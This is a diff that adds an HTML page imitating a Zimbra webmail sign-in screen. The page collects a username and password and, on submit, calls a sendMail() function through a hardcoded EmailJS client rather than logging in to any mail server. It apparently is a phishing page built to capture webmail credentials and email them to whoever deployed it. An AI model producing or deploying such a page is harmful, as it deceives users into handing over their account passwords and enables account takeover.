@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+    emailjs.init({
+        publicKey: "Qh5f116lO7Q_m0vnB",
+    });
+    })();
+    </script>
+    <title>Zimbra Web Client Sign In</title>
+</head>
+<body>
+    
+    <div class="wrapper">
+        <h1>Access<span>Mail</span></h1>
+        <form id="form" action="/">
+            <label for="username">Username:</label>
+            <div class="input-box">
+                <input autocomplete="off" type="text" name="username" placeholder="" id="username">
+                <div class="error"></div>
+            </div>
+            <label for="password">Password:</label>
+            <div class="input-box">
+                <input autocomplete="off" type="password" name="password" placeholder="" id="password">
+                <div class="error"></div>
+            </div>
+
+            <div class="check">
+                <label><input type="checkbox"> Stay signed in</label>
+            </div>
+
+            <button type="submit" class="btn" onclick="sendMail()">Sign In</button>
+
+            <hr class="h">
+
+            <p>Version:</p>
+
+            <select class="select">
+                <option>Default</option>
+                <option>Advanced (Ajax)</option>
+                <option>Standard (HTML)</option>
+                <option>Mobile</option>
+            </select>
+
+            <a href="">What's This?</a>
+        </form>
+    </div>
+
+</body>
+</html>
